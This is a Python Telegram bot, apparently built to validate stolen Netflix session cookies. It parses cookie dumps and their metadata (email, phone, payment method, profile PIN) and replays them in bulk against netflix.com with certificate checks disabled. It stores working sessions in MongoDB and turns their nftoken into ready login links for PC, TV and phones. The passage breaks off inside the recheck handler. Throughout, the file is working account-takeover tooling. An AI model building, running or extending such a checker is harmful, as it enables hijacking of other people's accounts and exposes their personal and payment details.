#!/usr/bin/env python3
"""
NETFLIX COOKIES CHECKER BOT - ENHANCED EDITION v2
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
- Robust Netscape + comment metadata parsing
- Accurate account info extraction (plan, profiles, extra members)
- Reliable nftoken extraction with URL encoding for all login links
- Fixed restart button and callback flows
- Retry logic and timeout improvements
- Full error handling with fallback checks
- Strict validation: if no account info found, cookie marked invalid
"""

import os
import sys
import time
import re
import base64
import logging
import asyncio
import aiohttp
import uuid
import hashlib
import urllib.parse
from datetime import datetime, timezone
from typing import Dict, List, Optional, Any, Tuple
from functools import wraps
from dotenv import load_dotenv

# Telegram
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application, CommandHandler, ContextTypes,
    CallbackQueryHandler, MessageHandler, filters,
    ConversationHandler
)

# Database
from pymongo import MongoClient, ASCENDING, DESCENDING
import pymongo

load_dotenv()

# ----------------------------- CONFIG ----------------------------------
BOT_TOKEN = os.getenv("BOT_TOKEN")
MONGODB_URI = os.getenv("MONGODB_URI")
DATABASE_NAME = os.getenv("DATABASE_NAME", "netflix_bot")
ADMIN_IDS = [int(id.strip()) for id in os.getenv("ADMIN_IDS", "").split(",") if id.strip()]

CHECK_TIMEOUT = int(os.getenv("CHECK_TIMEOUT", "30"))
MAX_BULK_CHECK = int(os.getenv("MAX_BULK_CHECK", "100"))
CONCURRENT_CHECKS = int(os.getenv("CONCURRENT_CHECKS", "5"))
EXPORT_DIR = os.getenv("EXPORT_DIR", "exports")
RETRY_COUNT = int(os.getenv("RETRY_COUNT", "2"))

# Logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO,
    handlers=[logging.FileHandler("netflix_bot.log"), logging.StreamHandler()]
)
logger = logging.getLogger("netflix_bot")

# ----------------------------- HELPERS ----------------------------------
def make_aware(dt):
    if dt and dt.tzinfo is None:
        return dt.replace(tzinfo=timezone.utc)
    return dt

def now_utc():
    return datetime.now(timezone.utc)

def parse_netscape(cookie_text: str) -> Tuple[Dict[str, str], Dict[str, str]]:
    """
    Parse multi‑line Netscape cookie file into dict and also extract metadata
    from comment lines (EMAIL, COUNTRY, PLAN, etc.)
    Returns (cookie_dict, metadata_dict)
    """
    cookie_dict = {}
    metadata = {}
    for line in cookie_text.strip().splitlines():
        line = line.strip()
        if not line:
            continue
        # Detect metadata lines: #KEY : value
        if line.startswith('#'):
            content = line[1:].strip()
            if ':' in content:
                key, val = content.split(':', 1)
                key = key.strip().upper()
                val = val.strip()
                # Store common metadata keys
                if key in ('EMAIL', 'COUNTRY', 'PLAN', 'PHONE', 'EXPIRE', 'DAYS LEFT',
                           'PAYMENT METHOD', 'PROFILE PIN', 'LANGUAGE', 'USERNAME',
                           'PROFILE', 'TIER'):
                    metadata[key] = val
            continue
        # Netscape format line: domain flag path secure expiry name value
        parts = line.split()
        if len(parts) >= 7:
            name, value = parts[5], parts[6]
            cookie_dict[name] = value
    return cookie_dict, metadata

def parse_cookie(cookie: str) -> Dict[str, str]:
    """
    Universal parser: Netscape multi‑line (with metadata), standard name=value, or base64.
    Returns dict of cookie key‑value pairs.
    """
    cookie = cookie.strip()
    # Try Netscape first (includes comments)
    parsed, _ = parse_netscape(cookie)
    if parsed:
        return parsed
    # Try base64 decode
    try:
        decoded = base64.b64decode(cookie, validate=True)
        cookie = decoded.decode('utf-8')
    except:
        pass
    # Standard format: key=value; key=value; ...
    cookie_dict = {}
    parts = cookie.split(';') if ';' in cookie else cookie.split()
    for part in parts:
        part = part.strip()
        if '=' in part:
            k, v = part.split('=', 1)
            cookie_dict[k.strip()] = v.strip()
    return cookie_dict

def extract_metadata_from_cookie_text(cookie_text: str) -> Dict[str, str]:
    """Extract metadata from comment lines (used for display)."""
    _, metadata = parse_netscape(cookie_text)
    return metadata

def validate_cookie(cookie: str) -> bool:
    """Quick format validation – doesn't check actual validity."""
    if not cookie:
        return False
    cookie = cookie.strip()
    if '.netflix.com' in cookie and 'TRUE' in cookie:
        return True
    if '=' in cookie:
        netflix_keys = {'NetflixId', 'nfvdid', 'SecureNetflixId', 'netflix_session'}
        cookie_lower = cookie.lower()
        return any(k.lower() in cookie_lower for k in netflix_keys)
    return False

def extract_nftoken(cookie_str: str) -> Optional[str]:
    """
    Robust extraction of 'ct' from NetflixId.
    Returns the raw token (without URL encoding) – encoding is done later.
    """
    # Method 1: parse and get NetflixId
    cookie_dict = parse_cookie(cookie_str)
    netflix_id = cookie_dict.get('NetflixId')
    if netflix_id:
        # NetflixId may contain URL encoding like ct%3D... -> decode first
        decoded_id = urllib.parse.unquote(netflix_id)
        # Split by & and find ct=
        for part in decoded_id.split('&'):
            if part.startswith('ct='):
                return part[3:]
        # Also try regex within decoded
        match = re.search(r'ct=([^&]+)', decoded_id)
        if match:
            return match.group(1)
    # Method 2: direct regex on the whole string (remove newlines first)
    clean = cookie_str.replace('\n', '').replace('\r', '')
    clean_decoded = urllib.parse.unquote(clean)
    match = re.search(r'ct=([^&\s;]+)', clean_decoded)
    if match:
        return match.group(1)
    return None

def extract_profiles_from_html(html: str) -> List[str]:
    """Extract profile names from Netflix HTML."""
    profiles = re.findall(r'"profileName"\s*:\s*"([^"]+)"', html, re.IGNORECASE)
    if profiles:
        return profiles
    match = re.search(r'profiles["\']?\s*:\s*\[([^\]]+)\]', html, re.IGNORECASE)
    if match:
        names = re.findall(r'name["\']?\s*:\s*"([^"]+)"', match.group(1), re.IGNORECASE)
        return names if names else ["Unknown"]
    return ["Unknown"]

def extract_account_info_from_html(html: str) -> Dict[str, str]:
    """Extract plan, profile, extra members, email from HTML."""
    info = {}
    # Plan - multiple patterns
    plan_patterns = [
        r'planName["\']?\s*[:=]\s*["\']([^"\']+)',
        r'plan["\']?\s*[:=]\s*["\']([^"\']+)',
        r'membership["\']?\s*[:=]\s*["\']([^"\']+)',
        r'tier["\']?\s*[:=]\s*["\']([^"\']+)',
        r'"planName"\s*:\s*"([^"]+)"',
        r'"plan"\s*:\s*"([^"]+)"'
    ]
    for pat in plan_patterns:
        match = re.search(pat, html, re.IGNORECASE)
        if match:
            info['plan'] = match.group(1)
            break
    # Profile name
    profile_match = re.search(r'profileName["\']?\s*[:=]\s*["\']([^"\']+)', html, re.IGNORECASE)
    info['profile'] = profile_match.group(1) if profile_match else None
    # Extra members
    if 'extra members' in html.lower() or 'extra' in html.lower():
        info['extra_members'] = 'Allowed'
    else:
        info['extra_members'] = 'Not detected'
    # Try to get email from HTML (rare)
    email_match = re.search(r'email["\']?\s*[:=]\s*["\']([^"\']+)', html, re.IGNORECASE)
    if email_match:
        info['email'] = email_match.group(1)
    return info

def format_valid_response(cookie_doc: Dict, result: Dict, metadata: Dict = None) -> str:
    """Build professional UI for valid cookie with full details."""
    now_str = now_utc().strftime("%Y-%m-%d %H:%M:%S UTC")
    tier = result.get('account_tier', 'Unknown')
    profile = result.get('profile_name', 'Unknown')
    profiles = result.get('profiles', [profile]) if result.get('profiles') else [profile]
    extra = result.get('extra_members', 'Not detected')
    if metadata is None:
        metadata = {}
    email = metadata.get('EMAIL', result.get('email', 'Not provided'))
    country = metadata.get('COUNTRY', 'Not provided')
    plan_detail = metadata.get('PLAN', '')
    expire = metadata.get('EXPIRE', '')
    days_left = metadata.get('DAYS LEFT', '')
    phone = metadata.get('PHONE', '')
    payment = metadata.get('PAYMENT METHOD', '')

    lines = [
        "✅ *Account is Active*",
        "━━━━━━━━━━━━━━━━━━━━━━",
        "",
        f"⏱ *Scan Time:* {now_str}",
        f"📧 *Email:* {email}",
        f"🌍 *Country:* {country}",
        f"📄 *Plan:* {tier}",
        f"📋 *Plan Detail:* {plan_detail if plan_detail else tier}",
        f"👥 *Profiles:* {', '.join(profiles[:5])}" + (f" +{len(profiles)-5} more" if len(profiles)>5 else ""),
        f"✅ *Extra members:* {extra}",
        f"📱 *Phone:* {phone if phone else 'Not provided'}",
        f"💳 *Payment:* {payment if payment else 'Not provided'}",
        f"⏳ *Expires:* {expire if expire else 'Unknown'}",
        f"📅 *Days left:* {days_left if days_left else 'Unknown'}",
        "",
        f"🆔 `{cookie_doc['_id'][:8]}`",
    ]
    return "\n".join(lines)

def format_invalid_response() -> str:
    """Professional invalid cookie message."""
    return (
        "❌ *Invalid or Expired Cookie*\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n\n"
        "We could not retrieve a valid token. This usually means:\n\n"
        "• Cookie is incomplete or missing NetflixId\n"
        "• Session has expired or been logged out\n"
        "• Netflix temporarily blocked the request\n"
        "• No account information could be extracted\n\n"
        "💡 *Try again:*\n"
        "1. Export fresh cookies from your browser\n"
        "2. Ensure NetflixId is included\n"
        "3. Wait a few minutes and retry\n\n"
        "Tap the button below to re‑check or scan a new file."
    )

# ----------------------------- DATABASE ---------------------------------
class Database:
    def __init__(self, uri=MONGODB_URI, db_name=DATABASE_NAME):
        if not uri:
            logger.error("MONGODB_URI not set!")
            self.client = None
            self.db = None
            return
        self.client = MongoClient(uri, serverSelectionTimeoutMS=5000)
        self.db = self.client[db_name]
        self.users = self.db.users
        self.cookies = self.db.cookies
        self.checks = self.db.checks
        self.settings = self.db.settings
        self._init_indexes()
        self._init_defaults()

    def _init_indexes(self):
        try:
            self.users.create_index([("user_id", ASCENDING)], unique=True)
            self.users.create_index([("approved", ASCENDING)])
            self.cookies.create_index([("cookie_hash", ASCENDING)], unique=True)
            self.cookies.create_index([("status", ASCENDING)])
            self.cookies.create_index([("account_tier", ASCENDING)])
            self.cookies.create_index([("user_id", ASCENDING)])
            self.checks.create_index([("timestamp", DESCENDING)])
        except Exception as e:
            logger.error(f"Index error: {e}")

    def _init_defaults(self):
        for admin in ADMIN_IDS:
            self.users.update_one(
                {"user_id": admin},
                {"$set": {"approved": True, "is_admin": True, "created_at": now_utc()}},
                upsert=True
            )

    def get_user(self, user_id: int):
        return self.users.find_one({"user_id": user_id})

    def create_user(self, user_id: int, username: str = None):
        existing = self.get_user(user_id)
        if existing:
            return existing
        user_data = {
            "user_id": user_id,
            "username": username,
            "approved": user_id in ADMIN_IDS,
            "is_admin": user_id in ADMIN_IDS,
            "created_at": now_utc(),
            "last_active": now_utc(),
            "total_checks": 0,
            "valid_cookies": 0
        }
        try:
            self.users.insert_one(user_data)
        except pymongo.errors.DuplicateKeyError:
            return self.get_user(user_id)
        return user_data

    def approve_user(self, user_id: int):
        return self.users.update_one({"user_id": user_id}, {"$set": {"approved": True}}).modified_count > 0

    def is_approved(self, user_id: int):
        user = self.get_user(user_id)
        return user and user.get("approved", False)

    def is_admin(self, user_id: int):
        user = self.get_user(user_id)
        return user and user.get("is_admin", False)

    def update_activity(self, user_id: int):
        self.users.update_one({"user_id": user_id}, {"$set": {"last_active": now_utc()}})

    def inc_stats(self, user_id: int, checks=1, valid=0):
        self.users.update_one({"user_id": user_id}, {"$inc": {"total_checks": checks, "valid_cookies": valid}})

    def add_cookie(self, cookie: str, user_id: int = None, metadata: Dict = None) -> str:
        cookie = cookie.strip()
        cookie_hash = hashlib.sha256(cookie.encode()).hexdigest()
        existing = self.cookies.find_one({"cookie_hash": cookie_hash})
        if existing:
            return existing["_id"]
        cookie_data = {
            "_id": str(uuid.uuid4()),
            "cookie": cookie,
            "cookie_hash": cookie_hash,
            "user_id": user_id,
            "status": "pending",
            "account_tier": None,
            "profile_name": None,
            "created_at": now_utc(),
            "checked_at": None,
            "extra": {"metadata": metadata or {}}
        }
        self.cookies.insert_one(cookie_data)
        return cookie_data["_id"]

    def add_cookies_bulk(self, cookies: List[str], user_id: int = None) -> List[Dict]:
        results = []
        for cookie in cookies:
            cookie = cookie.strip()
            if cookie and validate_cookie(cookie):
                try:
                    metadata = extract_metadata_from_cookie_text(cookie)
                    cid = self.add_cookie(cookie, user_id, metadata)
                    results.append({"cookie": cookie, "id": cid, "status": "added", "metadata": metadata})
                except Exception as e:
                    results.append({"cookie": cookie, "status": "error", "error": str(e)})
            else:
                results.append({"cookie": cookie, "status": "invalid_format"})
        return results

    def get_cookie(self, cookie_id: str):
        return self.cookies.find_one({"_id": cookie_id})

    def get_cookie_by_hash(self, cookie_hash: str):
        return self.cookies.find_one({"cookie_hash": cookie_hash})

    def update_cookie(self, cookie_id: str, updates: Dict):
        self.cookies.update_one({"_id": cookie_id}, {"$set": updates})

    def get_valid_cookies(self, limit=100):
        return list(self.cookies.find({"status": "valid"}).sort("checked_at", -1).limit(limit))

    def get_stats(self):
        total = self.cookies.count_documents({})
        valid = self.cookies.count_documents({"status": "valid"})
        invalid = self.cookies.count_documents({"status": "invalid"})
        expired = self.cookies.count_documents({"status": "expired"})
        pending = self.cookies.count_documents({"status": "pending"})
        tiers = {t: self.cookies.count_documents({"status": "valid", "account_tier": t}) for t in ["Basic", "Standard", "Premium"]}
        return {"total": total, "valid": valid, "invalid": invalid, "expired": expired, "pending": pending, "tiers": tiers}

    def delete_invalid(self):
        return self.cookies.delete_many({"status": {"$in": ["invalid", "expired"]}}).deleted_count

    def delete_all(self):
        total = self.cookies.count_documents({})
        self.cookies.delete_many({})
        return total

    def log_check(self, user_id: int, cookie_id: str, status: str, details: Dict = None):
        self.checks.insert_one({
            "user_id": user_id,
            "cookie_id": cookie_id,
            "status": status,
            "details": details or {},
            "timestamp": now_utc()
        })

    def get_user_checks(self, user_id: int, limit=5):
        return list(self.checks.find({"user_id": user_id}).sort("timestamp", -1).limit(limit))

db = Database()

# ----------------------------- CHECKER ENGINE ---------------------------
class NetflixChecker:
    @staticmethod
    async def check_single_cookie(cookie: str, retry: int = RETRY_COUNT) -> Dict:
        result = {
            "valid": False,
            "account_tier": None,
            "profile_name": None,
            "extra_members": "Not detected",
            "features": "None detected",
            "profiles": [],
            "email": None,
            "error": None,
            "metadata": extract_metadata_from_cookie_text(cookie)
        }
        parsed = parse_cookie(cookie)
        if not parsed:
            result["error"] = "Could not parse cookie"
            return result

        cookie_str = "; ".join([f"{k}={v}" for k, v in parsed.items()])
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.9",
            "Cookie": cookie_str,
            "Connection": "keep-alive",
            "Upgrade-Insecure-Requests": "1"
        }

        for attempt in range(retry + 1):
            try:
                async with aiohttp.ClientSession() as session:
                    timeout = aiohttp.ClientTimeout(total=CHECK_TIMEOUT, connect=15)
                    async with session.get(
                        "https://www.netflix.com/in/",
                        headers=headers,
                        timeout=timeout,
                        ssl=False,
                        allow_redirects=True
                    ) as resp:
                        final_url = str(resp.url)
                        html = await resp.text(errors='ignore')
                        html_lower = html.lower()
                        final_lower = final_url.lower()

                        # --- STRICT VALIDATION ---
                        # 1. Explicit login redirect
                        if "login" in final_lower or "signin" in final_lower:
                            result["error"] = "Redirected to login"
                            if attempt < retry:
                                await asyncio.sleep(1)
                                continue
                            return result

                        # 2. Error/sorry pages
                        if any(x in final_lower for x in ["error", "sorry", "whoops"]):
                            result["error"] = "Netflix error page"
                            if attempt < retry:
                                await asyncio.sleep(1)
                                continue
                            return result

                        # 3. Check for logged-in indicators
                        logged_in = False
                        if any(x in final_lower for x in ["browse", "profiles", "watch", "title", "your-account", "settings"]):
                            logged_in = True
                        else:
                            if "logout" in html_lower or "sign out" in html_lower:
                                logged_in = True
                            elif "your account" in html_lower or "manage profiles" in html_lower:
                                logged_in = True
                            elif 'netflix' in html_lower and 'sign in' not in html_lower:
                                if "profile" in html_lower or "avatar" in html_lower or "membership" in html_lower:
                                    logged_in = True
                        if not logged_in:
                            result["error"] = "Cookie invalid or expired"
                            if attempt < retry:
                                await asyncio.sleep(1)
                                continue
                            return result

                        # --- Extract account info ---
                        info = extract_account_info_from_html(html)
                        result["email"] = info.get('email')
                        result["account_tier"] = NetflixChecker._normalize_tier(info.get('plan', ''))
                        result["profile_name"] = info.get('profile', 'Unknown')
                        profiles = extract_profiles_from_html(html)
                        result["profiles"] = profiles if profiles else [result["profile_name"]]
                        result["extra_members"] = info.get('extra_members', 'Not detected')

                        # Merge metadata (may have better info)
                        meta = result.get("metadata", {})
                        if meta.get('PLAN'):
                            meta_tier = NetflixChecker._normalize_tier(meta['PLAN'])
                            if meta_tier != 'Unknown':
                                result["account_tier"] = meta_tier
                        if meta.get('EMAIL') and not result["email"]:
                            result["email"] = meta['EMAIL']
                        if meta.get('PROFILE') and result["profile_name"] == 'Unknown':
                            result["profile_name"] = meta['PROFILE']

                        # --- Check if we have enough info to consider valid ---
                        # If account_tier is Unknown and profile_name is Unknown and no profiles and no email
                        has_info = False
                        if result["account_tier"] != 'Unknown' or result["profile_name"] != 'Unknown':
                            has_info = True
                        if result["profiles"] and result["profiles"] != ['Unknown']:
                            has_info = True
                        if result.get("email"):
                            has_info = True
                        # Also check metadata for any useful info
                        if meta.get('EMAIL') or meta.get('PLAN') or meta.get('COUNTRY'):
                            has_info = True

                        if not has_info:
                            result["error"] = "No account information could be extracted"
                            if attempt < retry:
                                await asyncio.sleep(1)
                                continue
                            return result

                        result["valid"] = True
                        return result

            except asyncio.TimeoutError:
                result["error"] = f"Timeout (attempt {attempt+1})"
                if attempt < retry:
                    await asyncio.sleep(2)
                    continue
            except aiohttp.ClientError as e:
                result["error"] = f"Network error: {str(e)}"
                if attempt < retry:
                    await asyncio.sleep(2)
                    continue
            except Exception as e:
                result["error"] = str(e)
                if attempt < retry:
                    await asyncio.sleep(2)
                    continue

        return result

    @staticmethod
    def _normalize_tier(plan_str: str) -> str:
        plan_lower = plan_str.lower()
        if 'premium' in plan_lower or 'uhd' in plan_lower or '4k' in plan_lower:
            return 'Premium'
        if 'standard' in plan_lower or 'hd' in plan_lower:
            return 'Standard'
        if 'basic' in plan_lower:
            return 'Basic'
        return 'Unknown'

    @staticmethod
    async def check_bulk(cookies: List[str]) -> List[Dict]:
        sem = asyncio.Semaphore(CONCURRENT_CHECKS)
        async def check_one(c):
            async with sem:
                return await NetflixChecker.check_single_cookie(c)
        tasks = [check_one(c) for c in cookies]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        processed = []
        for i, r in enumerate(results):
            if isinstance(r, Exception):
                processed.append({"valid": False, "error": str(r), "cookie": cookies[i]})
            else:
                r["cookie"] = cookies[i]
                processed.append(r)
        return processed

# ----------------------------- INLINE KEYBOARDS -------------------------
def login_keyboard(cookie_id: str, nftoken: str) -> InlineKeyboardMarkup:
    if not nftoken:
        return InlineKeyboardMarkup([
            [InlineKeyboardButton("📤 Upload File", callback_data="bulk_prompt"),
             InlineKeyboardButton("🔄 Restart", callback_data="restart")]
        ])
    # URL encode the token for safe inclusion
    encoded = urllib.parse.quote(nftoken, safe='')
    return InlineKeyboardMarkup([
        [
            InlineKeyboardButton("🖥️ Login PC", url=f"https://netflix.com/login?nftoken={encoded}"),
            InlineKeyboardButton("📺 Login TV", url=f"https://netflix.com/tv8?nftoken={encoded}")
        ],
        [
            InlineKeyboardButton("📱 Android", url=f"https://netflix.com/android?nftoken={encoded}"),
            InlineKeyboardButton("🍏 iPhone", url=f"https://netflix.com/iphone?nftoken={encoded}")
        ],
        [
            InlineKeyboardButton("📤 Upload File", callback_data="bulk_prompt"),
            InlineKeyboardButton("🔄 Restart", callback_data="restart")
        ]
    ])

def invalid_keyboard(cookie_id: str) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🔄 Check Again", callback_data=f"recheck_{cookie_id}")],
        [InlineKeyboardButton("📤 Scan New File", callback_data="scan_new")]
    ])

def start_keyboard(user_id: int) -> InlineKeyboardMarkup:
    keyboard = [[InlineKeyboardButton("✅ Check", callback_data="check_prompt")]]
    if db.is_admin(user_id):
        keyboard.append([InlineKeyboardButton("📤 Bulk Check (Admin)", callback_data="bulk_prompt")])
    keyboard.append([InlineKeyboardButton("🔄 Restart", callback_data="restart")])
    return InlineKeyboardMarkup(keyboard)

# ----------------------------- TELEGRAM HANDLERS ------------------------
def admin_required(func):
    @wraps(func)
    async def wrapper(update, context, *args, **kwargs):
        if update.effective_user.id not in ADMIN_IDS:
            await update.message.reply_text("❌ Unauthorized.")
            return
        return await func(update, context, *args, **kwargs)
    return wrapper

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    db.create_user(user.id, user.username)
    if not db.is_approved(user.id):
        await update.message.reply_text("❌ Not approved. Contact admin.")
        return
    await update.message.reply_text(
        "📤 <b>Ready to Scan</b>\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n\n"
        "Send your cookies in ANY format:\n"
        "• 📄 <b>Netscape Files</b> (.txt)\n"
        "• 📦 <b>JSON Files</b> (.json)\n"
        "• 📝 <b>Raw Header Strings</b> (paste directly)\n\n"
        "<i>All formats are accepted and processed automatically.</i>",
        parse_mode="HTML",
        reply_markup=start_keyboard(user.id)
    )

async def check_prompt(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    await query.edit_message_text(
        "📥 *Send your cookie*\n\n"
        "You can paste a raw cookie string, or upload a `.txt` file (Netscape format).\n"
        "I'll auto‑detect the format and validate it.",
        parse_mode="Markdown"
    )

async def bulk_prompt(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    if not db.is_admin(user_id):
        await query.edit_message_text("❌ Only bot owner can use bulk check.")
        return
    await query.edit_message_text(
        "📁 *Bulk Check*\n\n"
        "Use the `/bulk` command and then upload one or more `.txt` files.\n"
        "Each file can contain up to 100 cookies (one per line).\n\n"
        "After uploading all files, type `/done` to see summary."
    )

async def restart(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user = query.from_user
    db.create_user(user.id, user.username)
    if not db.is_approved(user.id):
        await query.edit_message_text("❌ Not approved. Contact admin.")
        return
    await query.edit_message_text(
        "📤 <b>Ready to Scan</b>\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n\n"
        "Send your cookies in ANY format:\n"
        "• 📄 <b>Netscape Files</b> (.txt)\n"
        "• 📦 <b>JSON Files</b> (.json)\n"
        "• 📝 <b>Raw Header Strings</b> (paste directly)\n\n"
        "<i>All formats are accepted and processed automatically.</i>",
        parse_mode="HTML",
        reply_markup=start_keyboard(user.id)
    )

async def scan_new(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await check_prompt(update, context)

# ----------------------------- CHECK SINGLE -----------------------------
async def check_single(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if not db.is_approved(user.id):
        await update.message.reply_text("❌ Not approved.")
        return
    cookie = None
    if update.message.text:
        cookie = update.message.text.strip()
    elif update.message.document:
        doc = update.message.document
        if not doc.file_name.endswith(('.txt', '.json')):
            await update.message.reply_text("❌ Please upload a .txt or .json file.")
            return
        file = await context.bot.get_file(doc.file_id)
        content = await file.download_as_bytearray()
        cookie = content.decode('utf-8', errors='ignore').strip()
    else:
        await update.message.reply_text("❌ Please send a cookie string or a .txt file.")
        return

    if not cookie:
        await update.message.reply_text("❌ Empty content.")
        return

    if not validate_cookie(cookie):
        await update.message.reply_text("❌ Invalid cookie format. Please check your input.")
        return

    metadata = extract_metadata_from_cookie_text(cookie)
    cookie_id = db.add_cookie(cookie, user.id, metadata)
    msg = await update.message.reply_text("⏳ Checking...")
    result = await NetflixChecker.check_single_cookie(cookie)
    if result.get("valid"):
        db.update_cookie(cookie_id, {
            "status": "valid",
            "account_tier": result.get("account_tier"),
            "profile_name": result.get("profile_name"),
            "extra": {
                "profiles": result.get("profiles"),
                "extra_members": result.get("extra_members"),
                "metadata": result.get("metadata", {}),
                "email": result.get("email")
            },
            "checked_at": now_utc()
        })
        db.inc_stats(user.id, valid=1)
        db.log_check(user.id, cookie_id, "valid", result)
        db.update_activity(user.id)
        response = format_valid_response(db.get_cookie(cookie_id), result, metadata)
        nftoken = extract_nftoken(cookie)
        keyboard = login_keyboard(cookie_id, nftoken)
        await msg.edit_text(response, parse_mode="Markdown", reply_markup=keyboard)
    else:
        db.update_cookie(cookie_id, {"status": "invalid", "error": result.get("error"), "checked_at": now_utc()})
        db.inc_stats(user.id, valid=0)
        db.log_check(user.id, cookie_id, "invalid", result)
        response = format_invalid_response()
        keyboard = invalid_keyboard(cookie_id)
        await msg.edit_text(response, parse_mode="Markdown", reply_markup=keyboard)

# ----------------------------- BULK (ADMIN ONLY) ------------------------
BULK_STATE = 1

async def bulk_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if not db.is_admin(user.id):
        await update.message.reply_text("❌ Only bot owner can use bulk check.")
        return ConversationHandler.END
    if not db.is_approved(user.id):
        await update.message.reply_text("❌ Not approved.")
        return ConversationHandler.END
    context.user_data["bulk_files"] = []
    context.user_data["bulk_results"] = []
    await update.message.reply_text(
        "📁 *Bulk Upload*\n\n"
        "Send me one or more `.txt` files (each with cookies, one per line).\n"
        f"Max {MAX_BULK_CHECK} cookies per file.\n\n"
        "After all files, type `/done` to see summary.\n"
        "Cancel with `/cancel`."
    )
    return BULK_STATE

async def handle_bulk_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if not db.is_admin(user.id):
        await update.message.reply_text("❌ Only bot owner.")
        return BULK_STATE

    doc = update.message.document
    if not doc or not doc.file_name.endswith('.txt'):
        await update.message.reply_text("❌ Please send a .txt file.")
        return BULK_STATE

    msg = await update.message.reply_text("📥 Processing file...")
    try:
        file = await context.bot.get_file(doc.file_id)
        content = await file.download_as_bytearray()
        cookies = content.decode('utf-8', errors='ignore').splitlines()
        cookies = [c.strip() for c in cookies if c.strip()]
        if not cookies:
            await msg.edit_text("❌ File empty.")
            return BULK_STATE
        if len(cookies) > MAX_BULK_CHECK:
            await msg.edit_text(f"❌ Too many cookies ({len(cookies)} > {MAX_BULK_CHECK}).")
            return BULK_STATE

        added = db.add_cookies_bulk(cookies, user.id)
        valid_added = [c for c in added if c.get("status") == "added"]
        if not valid_added:
            await msg.edit_text("❌ No valid cookies in file.")
            return BULK_STATE

        check_list = [c["cookie"] for c in valid_added]
        results = await NetflixChecker.check_bulk(check_list)
        valid_count = 0
        for r in results:
            cookie = r.get("cookie", "")
            if not cookie:
                continue
            c_hash = hashlib.sha256(cookie.encode()).hexdigest()
            doc_cookie = db.get_cookie_by_hash(c_hash)
            if doc_cookie:
                if r.get("valid"):
                    db.update_cookie(doc_cookie["_id"], {
                        "status": "valid",
                        "account_tier": r.get("account_tier"),
                        "profile_name": r.get("profile_name"),
                        "extra": {
                            "profiles": r.get("profiles"),
                            "extra_members": r.get("extra_members"),
                            "metadata": r.get("metadata", {}),
                            "email": r.get("email")
                        },
                        "checked_at": now_utc()
                    })
                    valid_count += 1
                else:
                    db.update_cookie(doc_cookie["_id"], {"status": "invalid", "error": r.get("error"), "checked_at": now_utc()})
                db.log_check(user.id, doc_cookie["_id"], "valid" if r.get("valid") else "invalid", r)
        db.inc_stats(user.id, checks=len(results), valid=valid_count)
        db.update_activity(user.id)

        context.user_data["bulk_files"].append(doc.file_name)
        context.user_data["bulk_results"].append({
            "file": doc.file_name,
            "total": len(results),
            "valid": valid_count
        })

        await msg.edit_text(
            f"✅ *{doc.file_name}*\n"
            f"Processed: {len(results)}\n"
            f"Valid: {valid_count}\n"
            f"Invalid: {len(results)-valid_count}\n\n"
            "Send another file or `/done`."
        )
    except Exception as e:
        logger.error(f"Bulk file error: {e}")
        await msg.edit_text(f"❌ Error: {str(e)}")
    return BULK_STATE

async def bulk_done(update: Update, context: ContextTypes.DEFAULT_TYPE):
    files = context.user_data.get("bulk_files", [])
    results = context.user_data.get("bulk_results", [])
    if not files:
        await update.message.reply_text("❌ No files processed.")
    else:
        total_valid = sum(r["valid"] for r in results)
        total_cookies = sum(r["total"] for r in results)
        msg = f"📊 *Bulk Summary*\n\nFiles: {len(files)}\nTotal cookies: {total_cookies}\n✅ Valid: {total_valid}\n❌ Invalid: {total_cookies - total_valid}"
        await update.message.reply_text(msg, parse_mode="Markdown")
    context.user_data.clear()
    return ConversationHandler.END

async def cancel_bulk(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data.clear()
    await update.message.reply_text("❌ Cancelled.")
    return ConversationHandler.END

# ----------------------------- CALLBACK HANDLERS ------------------------
async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data

    if data == "restart":
        await restart(update, context)
        return

    if data == "check_prompt":
        await check_prompt(update, context)
        return

    if data == "scan_new":
        await scan_new(update, context)
        return

    if data == "bulk_prompt":
        await bulk_prompt(update, context)
        return

    if data.startswith("recheck_"):
        cookie_id = data.split("_", 1)[1]
        cookie_doc = db.get_cookie(cookie_id)
        if not cookie_doc:
            await query.edit_message_text("❌ Cookie not found.")
            return
        cookie = cookie_doc.get("cookie")
        await query.edit_message_text("⏳ Re‑checking...")
        result = await NetflixChecker.check_single_cookie(cookie)
        user_id = update.effective_user.id
        metadata = extract_metadata_from_cookie_text(cookie)
        if result.get("valid"):
            db.update_cookie(cookie_id, {
                "status": "valid",
                "account_tier": result.get("account_tier"),
                "profile_name": result.get("profile_name"),
                "extra": {
                    "profiles": result.get("profiles"),
                    "extra_members": result.get("extra_members"),
                    "metadata": metadata,
                    "email": result.get("email")
                },
                "checked_at": now_utc()
            })
            db.inc_stats(user_id, valid=1)
            db.log_check(user_id, cookie_id, "valid", result)
            response = format_valid_response(db.get_cookie(cookie_id), result, metadata)
            nftoken = extract_nftoken(cookie)
            keyboard = login_keyboard(cookie_id, nftoken)
